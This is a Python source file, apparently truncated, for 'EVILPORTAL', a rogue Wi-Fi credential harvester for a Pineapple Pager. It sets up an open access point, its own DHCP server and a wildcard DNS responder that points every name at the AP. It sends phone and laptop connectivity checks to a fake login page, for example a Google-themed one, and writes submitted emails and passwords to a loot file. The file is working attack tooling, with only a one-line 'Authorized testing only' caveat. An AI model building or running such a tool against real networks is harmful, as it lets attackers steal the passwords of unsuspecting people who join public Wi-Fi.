#!/usr/bin/env python3
"""EVILPORTAL - evil captive portal / credential harvester for the Pineapple Pager.

Serves an open rogue AP with a themed captive portal (Flipper Zero Evil Portal
HTML templates). When a device connects and submits the login form, the
credentials are captured to loot.

    evilportal.py run --ssid "Free WiFi" --portal portals/Google_Modern.html

Authorized testing only.
"""

import argparse
import json
import os
import re
import signal
import socket
import struct
import subprocess
import sys
import threading
import time

DEFAULT_AP_IP = "192.168.69.1"
AP_VIF_NAME = "evilportal0"

_BIN_DIRS = [
    "/usr/sbin", "/usr/bin", "/usr/local/sbin", "/usr/local/bin",
    "/mmc/usr/sbin", "/mmc/usr/bin", "/opt/usr/sbin", "/opt/usr/bin",
    "/sbin", "/bin",
]


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #

def read_text(path, limit=65536):
    try:
        with open(path, "r", errors="ignore") as f:
            return f.read(limit)
    except Exception:
        return ""


def run(cmd, timeout=20, **kw):
    kw.setdefault("capture_output", True)
    kw.setdefault("text", True)
    kw.setdefault("errors", "replace")
    try:
        return subprocess.run(cmd, timeout=timeout, **kw)
    except Exception:
        return None


def find_bin(*names):
    for n in names:
        try:
            r = subprocess.run(["which", n], capture_output=True, timeout=3)
            if r.returncode == 0 and r.stdout.strip():
                return r.stdout.strip().decode("utf-8", "ignore")
        except Exception:
            pass
        for d in _BIN_DIRS:
            cand = "%s/%s" % (d, n)
            if os.path.isfile(cand) and os.access(cand, os.X_OK):
                return cand
    return None


def list_interfaces():
    out = run(["iw", "dev"], timeout=5)
    ifaces = []
    if out and out.stdout:
        ifaces = re.findall(r"Interface\s+(\S+)", out.stdout)
    if not ifaces:
        out = run(["iwconfig"], timeout=5)
        if out and out.stdout:
            ifaces = re.findall(r"^(\w+)\s+IEEE", out.stdout, re.M)
    return ifaces


def default_route_iface():
    out = run(["ip", "route", "show", "default"], timeout=5)
    if out and out.stdout:
        m = re.search(r"\bdev\s+(\S+)", out.stdout)
        if m:
            return m.group(1)
    return None


def set_link_mode(iface, mode):
    run(["ip", "link", "set", iface, "down"], timeout=6)
    run(["iw", iface, "set", "type", mode], timeout=6)
    run(["ip", "link", "set", iface, "up"], timeout=6)


def band_for_freq(freq):
    try:
        freq = int(freq)
    except Exception:
        return "2.4"
    if freq >= 5925:
        return "6"
    if freq >= 4900:
        return "5"
    return "2.4"


def phy_for_iface(iface):
    if not iface:
        return None
    dev = run(["iw", "dev"], timeout=5)
    if not dev or not dev.stdout:
        return None
    phy, cur = None, None
    for line in dev.stdout.splitlines():
        m = re.match(r"phy#(\d+)", line)
        if m:
            cur = "phy" + m.group(1)
            continue
        m = re.match(r"\s*Interface\s+(\S+)", line)
        if m and m.group(1) == iface:
            phy = cur
            break
    return phy


def iface_band_support(iface):
    phy = phy_for_iface(iface)
    if not phy:
        return None
    out = run(["iw", "phy", phy, "info"], timeout=8)
    if not out or not out.stdout:
        return None
    bands = set()
    for m in re.finditer(r"\*\s*(\d+)\s*MHz", out.stdout):
        bands.add(band_for_freq(int(m.group(1))))
    return bands or None


def iface_exists(name):
    if not name:
        return False
    return os.path.isdir("/sys/class/net/" + name) or name in list_interfaces()


def iface_mac(name):
    txt = read_text("/sys/class/net/%s/address" % name, 64).strip().lower()
    if re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", txt):
        return txt
    return None


def delete_vif(name):
    if iface_exists(name):
        run(["ip", "link", "set", name, "down"], timeout=6)
        run(["iw", "dev", name, "del"], timeout=6)
        time.sleep(0.15)


def create_ap_vif(base_iface, name):
    phy = phy_for_iface(base_iface)
    if not phy:
        return False, "cannot resolve phy for %s" % (base_iface or "?")
    delete_vif(name)
    last = ""
    for typ in ("__ap", "ap"):
        r = run(["iw", "phy", phy, "interface", "add", name, "type", typ], timeout=8)
        if r and r.returncode == 0 and iface_exists(name):
            return True, name
        if r is not None:
            last = ((r.stderr or "") + " " + (r.stdout or "")).strip()
    return False, last or "interface add failed"


def phy_is_busy(phy):
    if not phy:
        return False
    dflt = default_route_iface()
    dev = run(["iw", "dev"], timeout=5)
    cur = None
    for line in (dev.stdout or "").splitlines():
        m = re.match(r"phy#(\d+)", line)
        if m:
            cur = "phy" + m.group(1)
            continue
        m = re.match(r"\s*Interface\s+(\S+)", line)
        if m and cur == phy:
            name = m.group(1)
            if dflt and name == dflt:
                return True
            if re.search(r"(mgmt|open|wpa|ent|cli)$", name):
                link = run(["ip", "link", "show", name], timeout=5)
                if link and link.stdout and "state UP" in link.stdout:
                    return True
    return False


def build_hostapd_conf(iface, ssid, channel, country="US"):
    band = "5" if int(channel) > 14 else "2.4"
    lines = [
        "interface=%s" % iface,
        "driver=nl80211",
        "ssid=%s" % ssid,
        "ctrl_interface=/var/run/hostapd",
        "ctrl_interface_group=0",
        "auth_algs=1",
        "wmm_enabled=1",
        "ignore_broadcast_ssid=0",
    ]
    if band == "5":
        lines += ["hw_mode=a", "channel=%d" % channel, "ieee80211d=1",
                  "country_code=%s" % country, "ieee80211n=1"]
    else:
        lines += ["hw_mode=g", "channel=%d" % channel, "ieee80211n=1"]
    return "\n".join(lines) + "\n"


# --------------------------------------------------------------------------- #
# DHCP (AF_PACKET, no UDP :67 conflict)
# --------------------------------------------------------------------------- #

DHCP_MAGIC = b"\x63\x82\x53\x63"
ETH_P_IP = 0x0800


def _checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def _dhcp_option(code, value):
    if isinstance(value, int):
        value = bytes([value])
    return bytes([code, len(value)]) + value


def _parse_dhcp_options(buf):
    opts, i = {}, 0
    while i + 2 <= len(buf):
        code = buf[i]
        if code == 0:
            i += 1
            continue
        if code == 255:
            break
        ln = buf[i + 1]
        val = buf[i + 2:i + 2 + ln]
        if len(val) < ln:
            break
        opts[code] = val[0] if code == 53 and val else val
        i += 2 + ln
    return opts


def parse_dhcp_packet(data):
    if not data or len(data) < 240 or data[236:240] != DHCP_MAGIC:
        return None
    if data[0] != 1 or data[1] != 1 or data[2] != 6:
        return None
    chaddr = data[28:34]
    mac = ":".join("%02x" % b for b in chaddr)
    if mac == "00:00:00:00:00:00":
        return None
    opts = _parse_dhcp_options(data[240:])
    mtype = opts.get(53)
    if mtype is None:
        return None
    ciaddr = data[12:16]
    return {
        "op": data[0], "xid": data[4:8],
        "flags": struct.unpack("!H", data[10:12])[0],
        "ciaddr": socket.inet_ntoa(ciaddr) if ciaddr != b"\x00" * 4 else "",
        "mac": mac, "chaddr": chaddr, "type": mtype, "options": opts,
    }


def _broadcast_of(ip, netmask):
    ipb, mb = socket.inet_aton(ip), socket.inet_aton(netmask)
    return socket.inet_ntoa(bytes(a | (~b & 0xff) for a, b in zip(ipb, mb)))


def build_dhcp_reply(req, msg_type, yiaddr, server_ip, lease_time=43200,
                     netmask="255.255.255.0", broadcast=False):
    flags = 0x8000 if broadcast else 0
    yiaddr_b = socket.inet_aton(yiaddr) if yiaddr else b"\x00" * 4
    header = (
        bytes([2, 1, 6, 0]) + req["xid"] + struct.pack("!HH", 0, flags)
        + b"\x00" * 4 + yiaddr_b + b"\x00" * 4 + b"\x00" * 4
        + req["chaddr"] + b"\x00" * (16 - len(req["chaddr"]))
        + b"\x00" * 64 + b"\x00" * 128 + DHCP_MAGIC
    )
    opts = [_dhcp_option(53, msg_type),
            _dhcp_option(54, socket.inet_aton(server_ip))]
    if msg_type in (2, 5):
        opts += [
            _dhcp_option(51, struct.pack("!I", lease_time)),
            _dhcp_option(1, socket.inet_aton(netmask)),
            _dhcp_option(3, socket.inet_aton(server_ip)),
            _dhcp_option(6, socket.inet_aton(server_ip)),
        ]
        if msg_type == 5:
            opts.append(_dhcp_option(28, socket.inet_aton(_broadcast_of(server_ip, netmask))))
    opts.append(b"\xff")
    body = header + b"".join(opts)
    if len(body) < 300:
        body += b"\x00" * (300 - len(body))
    return body


def build_udp_ip_frame(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, payload):
    src_mac_b = bytes(int(x, 16) for x in src_mac.split(":"))
    dst_mac_b = bytes(int(x, 16) for x in dst_mac.split(":"))
    udp_len = 8 + len(payload)
    udp = struct.pack("!HHHH", src_port, dst_port, udp_len, 0) + payload
    pseudo = (socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
              + struct.pack("!BBH", 0, 17, udp_len))
    csum = _checksum(pseudo + udp)
    if csum == 0:
        csum = 0xffff
    udp = udp[:6] + struct.pack("!H", csum) + udp[8:]
    total = 20 + len(udp)
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, 0, 0, 64, 17, 0,
                     socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    ip = ip[:10] + struct.pack("!H", _checksum(ip)) + ip[12:]
    return dst_mac_b + src_mac_b + struct.pack("!H", ETH_P_IP) + ip + udp


class DHCPResponder(threading.Thread):
    def __init__(self, iface, server_ip, leasefile, netmask="255.255.255.0",
                 pool_start=10, pool_end=100, lease_time=43200):
        super().__init__(daemon=True)
        self.iface = iface
        self.server_ip = server_ip
        self.leasefile = leasefile
        self.netmask = netmask
        self.pool_start = pool_start
        self.pool_end = pool_end
        self.lease_time = lease_time
        self.mac = iface_mac(iface) or "02:00:00:00:00:01"
        self._stop = threading.Event()
        self.sock = None
        self.error = None
        self._leases = {}
        self._offers = {}
        self._bad = {}
        self._lock = threading.Lock()
        self._last_write = 0.0

    def run(self):
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
            s.bind((self.iface, 0))
            s.settimeout(0.5)
            self.sock = s
        except Exception as e:
            self.error = str(e)
            return
        while not self._stop.is_set():
            try:
                frame, _ = self.sock.recvfrom(4096)
            except socket.timeout:
                self._prune()
                continue
            except Exception as e:
                self.error = str(e)
                break
            try:
                self._handle_frame(frame)
            except Exception:
                pass
            self._maybe_flush()
        try:
            self.sock.close()
        except Exception:
            pass

    def _handle_frame(self, frame):
        if len(frame) < 14 + 20 + 8 or frame[12:14] != struct.pack("!H", ETH_P_IP):
            return
        ip = frame[14:]
        if (ip[0] >> 4) != 4:
            return
        ihl = (ip[0] & 0x0f) * 4
        if len(ip) < ihl + 8 or ip[9] != 17:
            return
        udp = ip[ihl:]
        sport, dport, ulen, _ = struct.unpack("!HHHH", udp[:8])
        if dport != 67 or ulen < 8:
            return
        req = parse_dhcp_packet(udp[8:8 + ulen - 8])
        if req:
            req["sport"] = sport
            self._handle_request(req)

    def _pool(self):
        base = self.server_ip.rsplit(".", 1)[0]
        return ["%s.%d" % (base, i) for i in range(self.pool_start, self.pool_end + 1)]

    def _in_pool(self, ip):
        try:
            last = int(ip.rsplit(".", 1)[1])
        except Exception:
            return False
        return self.pool_start <= last <= self.pool_end

    def _available(self, ip, mac, t):
        if not self._in_pool(ip) or self._bad.get(ip, 0) > t:
            return False
        for m, l in self._leases.items():
            if m != mac and l["ip"] == ip and l["expiry"] > t:
                return False
        for m, (oip, oexp) in self._offers.items():
            if m != mac and oip == ip and oexp > t:
                return False
        return True

    def allocate(self, mac, t):
        with self._lock:
            l = self._leases.get(mac)
            if l and l["expiry"] > t:
                return l["ip"]
            o = self._offers.get(mac)
            if o and o[1] > t:
                return o[0]
            for ip in self._pool():
                if self._available(ip, mac, t):
                    self._offers[mac] = (ip, t + 120)
                    return ip
            return None

    def commit(self, mac, ip, t):
        with self._lock:
            for m in list(self._leases):
                if m != mac and self._leases[m]["ip"] == ip:
                    del self._leases[m]
            self._leases[mac] = {"ip": ip, "expiry": t + self.lease_time}
            self._offers.pop(mac, None)
        self.flush_leases()

    def release(self, mac):
        with self._lock:
            self._leases.pop(mac, None)
            self._offers.pop(mac, None)
        self.flush_leases()

    def decline(self, ip, t):
        with self._lock:
            self._bad[ip] = t + 300
            for m in list(self._leases):
                if self._leases[m]["ip"] == ip:
                    del self._leases[m]
            for m in list(self._offers):
                if self._offers[m][0] == ip:
                    del self._offers[m]

    def _prune(self):
        t = time.time()
        with self._lock:
            for m in [m for m, l in self._leases.items() if l["expiry"] <= t]:
                del self._leases[m]
            for m in [m for m, (i, e) in self._offers.items() if e <= t]:
                del self._offers[m]
            for ip in [ip for ip, e in self._bad.items() if e <= t]:
                del self._bad[ip]

    def _handle_request(self, req):
        t = time.time()
        mac, mtype = req["mac"], req["type"]
        if mtype == 1:  # DISCOVER
            ip = self.allocate(mac, t)
            if ip:
                self._send(req, 2, ip)
        elif mtype == 3:  # REQUEST
            sid = req["options"].get(54)
            if sid and socket.inet_ntoa(sid) != self.server_ip:
                return
            rip = req["options"].get(50)
            requested = socket.inet_ntoa(rip) if rip else (req["ciaddr"] or None)
            existing = self._leases.get(mac)
            ip = existing["ip"] if existing and existing["expiry"] > t else None
            if requested:
                if self._available(requested, mac, t):
                    ip = requested
                else:
                    self._send(req, 6, None, broadcast=True)
                    return
            if not ip:
                ip = self.allocate(mac, t)
            if not ip or not self._available(ip, mac, t):
                self._send(req, 6, None, broadcast=True)
                return
            self.commit(mac, ip, t)
            self._send(req, 5, ip)
        elif mtype == 7:  # RELEASE
            self.release(mac)
        elif mtype == 4:  # DECLINE
            rip = req["options"].get(50)
            if rip:
                self.decline(socket.inet_ntoa(rip), t)
        elif mtype == 8:  # INFORM
            self._send(req, 5, None)

    def _send(self, req, msg_type, yiaddr, broadcast=False):
        if not self.sock:
            return
        if broadcast or msg_type == 6 or (req.get("flags", 0) & 0x8000):
            broadcast = True
        dst_mac = "ff:ff:ff:ff:ff:ff" if broadcast else req["mac"]
        dst_ip = "255.255.255.255"
        if msg_type == 5 and req.get("ciaddr"):
            dst_ip = req["ciaddr"]
        body = build_dhcp_reply(req, msg_type, yiaddr, self.server_ip,
                                lease_time=self.lease_time, netmask=self.netmask)
        frame = build_udp_ip_frame(self.mac, dst_mac, self.server_ip, dst_ip,
                                   67, req.get("sport", 68), body)
        try:
            self.sock.sendto(frame, (self.iface, 0))
        except Exception:
            try:
                self.sock.send(frame)
            except Exception:
                pass

    def flush_leases(self):
        t = time.time()
        with self._lock:
            lines = ["%d %s %s * *" % (int(l["expiry"]), m, l["ip"])
                     for m, l in sorted(self._leases.items()) if l["expiry"] > t]
        if not self.leasefile:
            return
        try:
            tmp = self.leasefile + ".tmp"
            with open(tmp, "w") as f:
                f.write("\n".join(lines) + ("\n" if lines else ""))
            os.replace(tmp, self.leasefile)
        except Exception:
            pass

    def _maybe_flush(self):
        t = time.time()
        if t - self._last_write > 5:
            self._last_write = t
            self.flush_leases()

    def stop(self):
        self._stop.set()
        self.flush_leases()


# --------------------------------------------------------------------------- #
# wildcard DNS
# --------------------------------------------------------------------------- #

def build_dns_response(query, answer_ip):
    if not query or len(query) < 12:
        return None
    tid = query[:2]
    if query[2] & 0x80:
        return None
    i = 12
    while i < len(query) and query[i] != 0:
        i += query[i] + 1
    i += 1
    if i + 4 > len(query):
        return None
    qtype = struct.unpack("!H", query[i:i + 2])[0]
    question = query[12:i + 4]
    ip = socket.inet_aton(answer_ip)
    if qtype not in (1, 255):
        return tid + b"\x81\x80" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00" + question
    answer = b"\xc0\x0c\x00\x01\x00\x01" + struct.pack("!I", 30) + b"\x00\x04" + ip
    return tid + b"\x81\x80" + b"\x00\x01" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00" + question + answer


class MiniDNS(threading.Thread):
    def __init__(self, bind_ip, answer_ip, port=53):
        super().__init__(daemon=True)
        self.bind_ip, self.answer_ip, self.port = bind_ip, answer_ip, port
        self._stop = threading.Event()
        self.sock = None
        self.error = None

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.bind_ip, self.port))
            s.settimeout(0.5)
            self.sock = s
        except Exception as e:
            self.error = str(e)
            return
        while not self._stop.is_set():
            try:
                data, addr = self.sock.recvfrom(2048)
            except socket.timeout:
                continue
            except Exception:
                break
            resp = build_dns_response(data, self.answer_ip)
            if resp:
                try:
                    self.sock.sendto(resp, addr)
                except Exception:
                    pass
        try:
            self.sock.close()
        except Exception:
            pass

    def stop(self):
        self._stop.set()


# --------------------------------------------------------------------------- #
# captive portal
# --------------------------------------------------------------------------- #

PROBE_PATHS = {
    "/hotspot-detect.html", "/library/test/success.html", "/generate_204",
    "/gen_204", "/connecttest.txt", "/redirect", "/ncsi.txt",
    "/canonical.html", "/success.txt", "/check_network_status.txt",
    "/hotspotdetect.html", "/captiveportal.html",
}

_SUCCESS = """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title><style>
body{margin:0;font-family:system-ui,sans-serif;background:#0b0f0c;color:#cfe;
display:flex;align-items:center;justify-content:center;min-height:100vh}
h1{color:#2fbf5f;font-weight:600}</style></head><body>
<h1>You are connected.</h1></body></html>"""


def _parse_qs(qs):
    out = {}
    for pair in qs.split("&"):
        if not pair:
            continue
        k, _, v = pair.partition("=")
        out[_unquote(k)] = _unquote(v)
    return out


def _unquote(s):
    if isinstance(s, str):
        s = s.encode("utf-8", "ignore")
    out = bytearray()
    i, n = 0, len(s)
    while i < n:
        c = s[i]
        if c == 0x2B:
            out.append(0x20)
            i += 1
        elif c == 0x25 and i + 2 < n:
            try:
                out.append(int(s[i + 1:i + 3].decode("ascii"), 16))
                i += 3
            except Exception:
                out.append(c)
                i += 1
        else:
            out.append(c)
            i += 1
    return out.decode("utf-8", "replace")


class PortalServer:
    _REASONS = {200: "OK", 302: "Found", 404: "Not Found"}

    def __init__(self, engine, host, port, html):
        self.engine = engine
        self.host = host
        self.port = port
        self.html = html
        self.sock = None
        self.thread = None
        self.redirect = False
        self.redirect_backend = None
        self._stop = threading.Event()

    def start(self):
        try:
            self._bind(self.port)
            return True
        except Exception:
            pass
        try:
            self._bind(8080)
            self.port = 8080
            self.redirect = self._install_redirect(80, 8080)
            return True
        except Exception:
            return False

    def _bind(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.host, port))
        s.listen(64)
        s.settimeout(0.5)
        self.sock = s
        self.thread = threading.Thread(target=self._serve, daemon=True)
        self.thread.start()

    def _serve(self):
        while not self._stop.is_set():
            try:
                conn, addr = self.sock.accept()
            except socket.timeout:
                continue
            except Exception:
                break
            threading.Thread(target=self._handle, args=(conn, addr), daemon=True).start()

    def _handle(self, conn, addr):
        try:
            conn.settimeout(10)
            req = self._read_request(conn)
            if req is None:
                return
            method, path, query, headers, body = req
            ip = addr[0]
            ua = headers.get("user-agent", "")
            if method == "POST":
                self._do_post(ip, ua, headers, body, conn)
            else:
                self._do_get(ip, ua, path, query, conn)
        except Exception:
            pass
        finally:
            try:
                conn.close()
            except Exception:
                pass

    @staticmethod
    def _read_request(conn):
        data = b""
        while b"\r\n\r\n" not in data and len(data) < 65536:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        head, _, rest = data.partition(b"\r\n\r\n")
        if b"\r\n" not in head:
            return None
        lines = head.split(b"\r\n")
        parts = lines[0].decode("utf-8", "ignore").split(" ")
        if len(parts) < 2:
            return None
        method = parts[0].upper()
        raw_path = parts[1]
        path, _, qs = raw_path.partition("?")
        headers = {}
        for line in lines[1:]:
            if b":" in line:
                k, v = line.split(b":", 1)
                headers[k.decode("utf-8", "ignore").strip().lower()] = v.decode("utf-8", "ignore").strip()
        try:
            length = int(headers.get("content-length", "0") or 0)
        except Exception:
            length = 0
        length = min(length, 32768)
        body = rest
        while len(body) < length:
            chunk = conn.recv(length - len(body))
            if not chunk:
                break
            body += chunk
        return method, path, qs, headers, body[:length]

    def _do_get(self, ip, ua, path, query, conn):
        if path in PROBE_PATHS:
            self._respond(conn, 302, "text/plain", b"",
                          {"Location": "http://%s/" % self.engine.ap_ip})
            return
        if path == "/get" or path == "/submit" or path == "/login":
            fields = _parse_qs(query)
            self.engine.capture(ip, ua, fields)
            self._respond(conn, 200, "text/html; charset=utf-8",
                          _SUCCESS.encode("utf-8", "ignore"))
            return
        if path == "/success":
            self._respond(conn, 200, "text/html; charset=utf-8",
                          _SUCCESS.encode("utf-8", "ignore"))
            return
        self._respond(conn, 200, "text/html; charset=utf-8",
                      self.html.encode("utf-8", "ignore"))

    def _do_post(self, ip, ua, headers, body, conn):
        ctype = headers.get("content-type", "")
        fields = {}
        if "application/x-www-form-urlencoded" in ctype:
            try:
                fields = _parse_qs(body.decode("utf-8", "ignore"))
            except Exception:
                fields = {}
        elif "application/json" in ctype:
            try:
                obj = json.loads(body.decode("utf-8", "ignore"))
                fields = obj if isinstance(obj, dict) else {}
            except Exception:
                fields = {}
        self.engine.capture(ip, ua, fields)
        self._respond(conn, 200, "text/html; charset=utf-8",
                      _SUCCESS.encode("utf-8", "ignore"))

    @classmethod
    def _respond(cls, conn, code, ctype, body, extra=None):
        reason = cls._REASONS.get(code, "OK")
        head = ["HTTP/1.1 %d %s" % (code, reason),
                "Content-Type: %s" % ctype,
                "Content-Length: %d" % len(body),
                "Cache-Control: no-store, no-cache, must-revalidate",
                "Connection: close"]
        for k, v in (extra or {}).items():
            head.append("%s: %s" % (k, v))
        try:
            conn.sendall("\r\n".join(head).encode("utf-8", "ignore") + b"\r\n\r\n" + body)
        except Exception:
            pass

    def _install_redirect(self, src, dst):
        iface = self.engine.ap_iface
        nft = find_bin("nft")
        if nft:
            script = ("table ip evilportal {\n"
                      "  chain prerouting {\n"
                      "    type nat hook prerouting priority -100; policy accept;\n"
                      '    iifname "%s" tcp dport %d redirect to :%d\n'
                      "  }\n"
                      "}\n" % (iface, src, dst))
            path = "/tmp/evilportal_nft.conf"
            try:
                with open(path, "w") as f:
                    f.write(script)
            except Exception:
                return False
            run([nft, "delete", "table", "ip", "evilportal"], timeout=6)
            r = run([nft, "-f", path], timeout=8)
            if r and r.returncode == 0:
                self.redirect_backend = "nft"
                return True
        ipt = find_bin("iptables")
        if not ipt:
            return False
        r = run([ipt, "-t", "nat", "-A", "PREROUTING", "-i", iface,
                 "-p", "tcp", "--dport", str(src), "-j", "REDIRECT",
                 "--to-ports", str(dst)], timeout=6)
        if r and r.returncode == 0:
            self.redirect_backend = "iptables"
            return True
        return False

    def stop(self):
        self._stop.set()
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None
        self.thread = None
        if self.redirect:
            iface = self.engine.ap_iface
            if self.redirect_backend == "nft":
                nft = find_bin("nft")
                if nft:
                    run([nft, "delete", "table", "ip", "evilportal"], timeout=6)
            else:
                ipt = find_bin("iptables")
                if ipt:
                    run([ipt, "-t", "nat", "-D", "PREROUTING", "-i", iface,
                         "-p", "tcp", "--dport", "80", "-j", "REDIRECT",
                         "--to-ports", "8080"], timeout=6)


# --------------------------------------------------------------------------- #
# rogue AP
# --------------------------------------------------------------------------- #

class ManagedProc:
    def __init__(self, name, argv, log_path):
        self.name, self.argv, self.log_path = name, argv, log_path
        self.proc = None

    def start(self):
        try:
            log = open(self.log_path, "ab")
            self.proc = subprocess.Popen(self.argv, stdout=log,
                                         stderr=subprocess.STDOUT, close_fds=True)
            return True
        except Exception:
            return False

    def alive(self):
        return self.proc is not None and self.proc.poll() is None

    def tail(self, n=800):
        return read_text(self.log_path, n)[-n:]

    def stop(self, timeout=3):
        if self.proc:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=timeout)
            except Exception:
                try:
                    self.proc.kill()
                except Exception:
                    pass
            self.proc = None


class RogueAP:
    def __init__(self, engine, iface, ssid, channel, ip=DEFAULT_AP_IP, country="US"):
        self.engine = engine
        self.iface = iface
        self.ap_iface = iface
        self.ssid, self.channel, self.ip, self.country = ssid, channel, ip, country
        self.base = "/tmp/evilportal"
        self.hostapd_conf = self.base + "_hostapd.conf"
        self.leasefile = self.base + "_leases"
        self.hostapd = None
        self.dhcp = None
        self.dns = None
        self.portal = None
        self.mode = "base"
        self.orig_type = None

    def _prepare_interface(self):
        ok, detail = create_ap_vif(self.iface, AP_VIF_NAME)
        if ok:
            self.ap_iface = detail
            self.mode = "vif"
            return
        info = run(["iw", "dev", self.iface, "info"], timeout=5)
        m = re.search(r"type\s+(\S+)", (info.stdout or "") if info else "")
        self.orig_type = m.group(1) if m else "managed"
        self.ap_iface = self.iface
        self.mode = "base"

    def start(self):
        hostapd_bin = find_bin("hostapd")
        if not hostapd_bin:
            return False, "hostapd not found"
        os.makedirs("/var/run/hostapd", exist_ok=True)
        self._prepare_interface()
        run(["ip", "addr", "flush", "dev", self.ap_iface], timeout=6)
        run(["ip", "addr", "add", "%s/24" % self.ip, "dev", self.ap_iface], timeout=6)
        run(["ip", "link", "set", self.ap_iface, "up"], timeout=6)
        conf = build_hostapd_conf(self.ap_iface, self.ssid, self.channel, self.country)
        with open(self.hostapd_conf, "w") as f:
            f.write(conf)
        run(["rm", "-f", self.base + "_hostapd.log"], timeout=3)
        self.hostapd = ManagedProc("hostapd", [hostapd_bin, self.hostapd_conf],
                                   self.base + "_hostapd.log")
        if not self.hostapd.start():
            return False, "could not spawn hostapd"
        for _ in range(24):
            time.sleep(0.25)
            if not self.hostapd.alive():
                break
            out = run(["iw", "dev", self.ap_iface, "info"], timeout=5)
            if out and "type AP" in (out.stdout or ""):
                break
        if not self.hostapd.alive():
            tail = self.hostapd.tail(400)
            self.hostapd.stop()
            self.hostapd = None
            return False, "hostapd exited: " + tail
        if hasattr(socket, "AF_PACKET"):
            self.dhcp = DHCPResponder(self.ap_iface, self.ip, self.leasefile)
            self.dhcp.start()
        self.dns = MiniDNS(self.ip, self.ip)
        self.dns.start()
        self.portal = PortalServer(self.engine, self.ip, self.engine.http_port,
                                   self.engine.html)
        self.portal.start()
        return True, ""

    def stop(self):
        if self.portal:
            self.portal.stop()
            self.portal = None
        if self.dns:
            self.dns.stop()
            self.dns = None
        if self.dhcp:
            self.dhcp.stop()
            self.dhcp = None
        if self.hostapd:
            self.hostapd.stop()
            self.hostapd = None
        if self.mode == "vif":
            delete_vif(self.ap_iface)
        else:
            run(["ip", "addr", "flush", "dev", self.ap_iface], timeout=6)
            if self.orig_type:
                try:
                    set_link_mode(self.ap_iface, self.orig_type)
                except Exception:
                    pass
        for f in (self.hostapd_conf,):
            try:
                os.remove(f)
            except Exception:
                pass


# --------------------------------------------------------------------------- #
# engine
# --------------------------------------------------------------------------- #

class Engine:
    def __init__(self, args):
        self.args = args
        self.ap_ip = args.ap_ip
        self.http_port = args.http_port
        self.html = read_text(args.portal)
        self.ap_iface = args.iface
        self.running = True
        self.creds_path = os.path.join(args.loot, "creds.jsonl")
        self._lock = threading.Lock()

    def log(self, msg):
        line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
        print(line, flush=True)

    def capture(self, ip, ua, fields):
        email = fields.get("email", "") or fields.get("username", "") or ""
        password = fields.get("password", "") or ""
        if not email and not password:
            return
        rec = {"t": time.time(), "ip": ip, "email": email, "password": password,
               "ua": ua[:200]}
        try:
            os.makedirs(self.args.loot, exist_ok=True)
            with open(self.creds_path, "a") as f:
                f.write(json.dumps(rec, separators=(",", ":")) + "\n")
            os.chmod(self.creds_path, 0o600)
        except Exception:
            pass
        self.log("CAPTURED  %s | email=%s password=%s" % (ip, email, password))

    def pick_iface(self):
        if self.ap_iface:
            return
        raw = list_interfaces()
        dflt = default_route_iface()
        bases = [i for i in raw if re.fullmatch(r"wlan\d+", i)] or \
                [i for i in raw if not i.endswith(("mon", "cli", "wpa", "sta"))]
        pool = [i for i in bases if i != dflt] or bases
        for cand in ("wlan1", "wlan2", "wlan0"):
            if cand in pool:
                self.ap_iface = cand
                return
        if pool:
            self.ap_iface = pool[0]

    def start(self):
        os.makedirs(self.args.loot, exist_ok=True)
        try:
            os.chmod(self.args.loot, 0o700)
        except Exception:
            pass
        self.pick_iface()
        if not self.ap_iface:
            self.log("ERROR: no usable radio found")
            return False
        # safety guard: refuse to share the Pager's own uplink/AP phy
        if not self.args.no_guard:
            phy = phy_for_iface(self.ap_iface)
            if phy_is_busy(phy):
                self.log("ERROR: radio %s is busy serving the Pager's own WiFi" % self.ap_iface)
                self.log("  (disconnect the uplink/mgmt AP, or pass --no-guard)")
                return False
        self.rogue = RogueAP(self, self.ap_iface, self.args.ssid, self.args.channel,
                             ip=self.ap_ip, country=self.args.country)
        ok, err = self.rogue.start()
        if not ok:
            self.log("ERROR: %s" % err)
            self.rogue.stop()
            return False
        self.log("AP LIVE: \"%s\" ch%d on %s @ %s" % (self.args.ssid, self.args.channel,
                 self.rogue.ap_iface, self.ap_ip))
        self.log("portal: %s (port %d)" % (self.args.portal, self.http_port))
        self.log("loot:  %s" % self.creds_path)
        return True

    def run(self):
        if not self.start():
            return 1
        while self.running:
            time.sleep(0.3)
        self.rogue.stop()
        self.log("stopped")
        return 0


def build_parser():
    p = argparse.ArgumentParser(description="EVILPORTAL engine")
    sub = p.add_subparsers(dest="mode")
    r = sub.add_parser("run")
    r.add_argument("--ssid", default="Free WiFi")
    r.add_argument("--channel", type=int, default=6)
    r.add_argument("--portal", default="portals/Google_Modern.html")
    r.add_argument("--ap-ip", default=DEFAULT_AP_IP)
    r.add_argument("--http-port", type=int, default=80)
    r.add_argument("--loot", default="/root/loot/evilportal")
    r.add_argument("--country", default="US")
    r.add_argument("--iface", default=None)
    r.add_argument("--no-guard", action="store_true")
    sub.add_parser("selftest")
    return p


def selftest():
    checks = []

    def check(name, fn):
        try:
            fn()
            checks.append((name, True))
        except Exception as e:
            checks.append((name, False, "%s: %s" % (type(e).__name__, e)))

    def t_qs():
        q = _parse_qs("email=test%40example.com&password=hunter%2Btwo")
